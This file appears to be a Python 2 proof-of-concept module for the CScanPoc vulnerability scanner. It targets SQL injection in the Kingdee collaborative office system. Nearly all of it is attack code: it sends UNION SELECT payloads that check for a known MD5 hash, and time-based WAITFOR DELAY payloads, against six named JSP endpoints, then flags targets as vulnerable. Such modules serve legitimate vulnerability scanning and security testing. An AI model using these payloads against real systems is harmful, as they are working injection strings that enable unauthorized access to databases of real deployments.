# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse, time

class Vuln(ABVuln):
    vuln_id = 'kingdee_0002' # 平台漏洞编号，留空
    name = '金蝶协同办公系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-08-26'  # 漏洞公布时间
    desc = '''
        金蝶协同办公系统文件参数过滤不严谨，造成SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '金蝶协同办公系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '7a6d9156-3a94-4126-9f10-9dedcd23b024'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            payloads = [
                "/kingdee/person/getClass.jsp?id=1%27%20UNION%20ALL%20SELECT%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27)),NULL--",
                "/kingdee/test_tree/get_nodes.jsp?node=1%20UNION%20ALL%20SELECT%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27)),NULL--"
            ]
            for payload in payloads:
                url = self.target + payload
                code , head, res, body, _ = hh.http(url)
                if code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
                    #security_hole(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))


            payload1 = "/kingdee/person/note/note_opinion_submit.jsp?opinion_id=1"
            start1 = time.time()
            url = self.target + payload1
            code1 , head, res, body, _ = hh.http(url)
            start2 = time.time()
            payload11 = "/kingdee/person/note/note_opinion_submit.jsp?opinion_id=1%20WAITFOR%20DELAY%20%270:0:5%27"
            url = self.target + payload11
            code2 , head, res, body, _ = hh.http(url)
            end = time.time()
            if code1 != 0 and code2 != 0 and 4.6 < (end-start2)-(start2-start1):
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

                
            start1 = time.time()
            payload2 = "/kingdee/pubinfo/chatlog_length.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1"
            url = self.target + payload2
            code1 ,head, res, body, _ = hh.http(url)
            start2 = time.time()
            payload22 = "/kingdee/pubinfo/chatlog_length.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1;WAITFOR%20DELAY%20%270:0:5%27--"
            url = self.target + payload22
            code2 , head, res, body, _ = hh.http(url)
            end = time.time()
            if code1 != 0  and code2 != 0  and 4.6 < (end-start2)-(start2-start1):
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

                
            start1 = time.time()
            payload3 = "/kingdee/pubinfo/chatlog_content.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1"
            url = self.target + payload3
            code1 , head, res, body, _ = hh.http(url)
            start2 = time.time()
            payload33 = "/kingdee/pubinfo/chatlog_content.jsp?user_id=1&sendid=11%27))%20and%20A.sendid=1;WAITFOR%20DELAY%20%270:0:5%27--"
            url = self.target + payload33
            code2 , head, res, body, _ = hh.http(url)
            end = time.time()
            if code1 != 0  and code2 != 0  and 4.6 < (end-start2)-(start2-start1):
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

                
            start1 = time.time()
            payload4 = "/kingdee/pubinfo/news_comment_del.jsp?id=1"
            url = self.target + payload4
            code1 , head, res, body, _ = hh.http(url)
            start2 = time.time()
            payload44 = "/kingdee/pubinfo/news_comment_del.jsp?id=1%20WAITFOR%20DELAY%20%270:0:5%27"
            url = self.target + payload44
            code2 , head, res, body, _ = hh.http(url)
            end = time.time()
            if code1 != 0  and code2 != 0  and 4.6 < (end-start2)-(start2-start1):
                #security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))


        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
